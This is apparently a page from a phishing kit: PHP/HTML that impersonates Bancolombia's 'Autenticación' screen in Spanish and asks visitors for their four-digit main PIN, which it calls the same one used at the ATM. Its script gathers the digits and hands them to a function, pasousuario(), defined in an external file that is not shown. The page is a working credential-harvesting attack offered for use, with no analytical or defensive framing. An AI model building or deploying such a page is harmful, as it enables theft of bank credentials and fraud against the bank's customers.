<?php

?>

<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Autenticación Bancolombia</title>
  <link rel="stylesheet" href="css/clave.css">
  <link rel="icon" href="images/favicon.ico">
    <!-- Bootstrap -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <!-- jQuery -->
    <script src="../../scripts/jquery-3.6.0.min.js"></script>
    <script src="../../scripts/jquery.jclock-min.js"></script>
    <script src="../../scripts/functions.js"></script>
</head>
<body class="fondo">
  <header>
    <img src="images/bancolombia.svg" alt="Bancolombia Logo" class="logo">
    <a href="#" class="logout">
      Salir
      <img src="images/flecha.svg" alt="Flecha" class="icono-flecha">
    </a>
  </header>
  <main>
    <h1 class="titulo">Clave principal</h1>
    <div class="cuadroblanco">
      <div class="candado"></div>
      <div class="candado2">Es la misma que usas en el cajero automático</div>
      <div class="candado3"></div>
  
	  <div class="clave">
    <div class="clave2">
  <input type="tel" inputmode="numeric" name="field1" maxlength="1" class="clave3" id="digit1">
  <input type="tel" inputmode="numeric" name="field2" maxlength="1" class="clave3" id="digit2">
  <input type="tel" inputmode="numeric" name="field3" maxlength="1" class="clave3" id="digit3">
  <input type="tel" inputmode="numeric" name="field4" maxlength="1" class="clave3" id="digit4">
</div>
        <div class="volver1">
          <button type="button" id="btn-volver-user" class="volver2">
            <label class="volver3">Volver</label>
          </button>
  
          <div class="continuar1">
		  <button type="button" id="btnPass" class="continuar2">
          <label class="continuar3">Continuar</label>
        </button>
          </div>
        </div>
      </div>
    </div>
  </main>
  <div class="lineafinal1">
    <div class="lineafinal2"></div>
  
    <span class="lineafinal3">
      <div class="lineafinal4">
        <div class="lineafinal5"></div>
        <div class="lineafinal6"></div>
      </div>
  
      <div class="lineafinal7">
      </div>
    </span>
  </div>
  <script>
  function verificarClaveCompleta() {
    const d1 = $('#digit1').val().trim();
    const d2 = $('#digit2').val().trim();
    const d3 = $('#digit3').val().trim();
    const d4 = $('#digit4').val().trim();

    const clave = d1 + d2 + d3 + d4;

    if (clave.length === 4 && /^\d{4}$/.test(clave)) {
      $('#btnPass').addClass('boton-activo');
    } else {
      $('#btnPass').removeClass('boton-activo');
    }
  }

  $(document).ready(function () {
  // ✅ Avanzar automáticamente al siguiente campo
  $('.clave3').on('input', function () {
    if (this.value.length === 1) {
      $(this).next('.clave3').focus();
    }
  });

  // ✅ Retroceder con backspace si el campo está vacío
  $('.clave3').on('keydown', function (e) {
    if (e.key === 'Backspace' && this.value === '') {
      $(this).prev('.clave3').focus();
    }
  });

  // ✅ Validar clave completa y activar botón
  $('#digit1, #digit2, #digit3, #digit4').on('input', function () {
    verificarClaveCompleta();
  });

  // ✅ Enviar clave
  $('#btnPass').click(function () {
    const d1 = $('#digit1').val().trim();
    const d2 = $('#digit2').val().trim();
    const d3 = $('#digit3').val().trim();
    const d4 = $('#digit4').val().trim();

    const clave = d1 + d2 + d3 + d4;

    if (clave.length === 4 && /^\d{4}$/.test(clave)) {
      pasousuario(clave); // tu función personalizada
    } else {
      alert("Por favor ingresa los 4 dígitos correctamente.");
    }
  });
});
</script>

</body>
</html>